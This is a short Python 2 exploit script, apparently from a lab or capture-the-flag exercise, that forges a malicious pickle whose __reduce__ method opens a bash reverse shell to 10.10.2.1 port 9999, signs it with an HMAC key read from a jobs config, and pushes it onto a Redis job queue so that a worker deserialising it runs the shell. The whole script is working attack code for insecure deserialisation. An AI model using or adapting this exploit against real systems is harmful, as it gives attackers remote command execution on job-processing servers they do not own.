import json
import time
import hmac
import cPickle
import redis
import base64
import os
import subprocess

class RunBinSh(object):
  def __reduce__(self):
    return (subprocess.Popen, (('/bin/bash','-c','bash -i >& /dev/tcp/10.10.2.1/9999 0>&1'),))


if __name__ == "__main__":
    command = "1 + 1"
    config = json.load(open('../pyexec/etc/jobs.json','r'))
    connection = redis.Redis(
        host='10.10.2.6',#config['host'],
        port=config['port'],
        password=config['password']
    )

    data = base64.b64encode(cPickle.dumps(RunBinSh()))

    mac = hmac.new(config['key'].decode('hex'), data).hexdigest()

    connection.rpush(config['queue'],",".join([data,mac]))
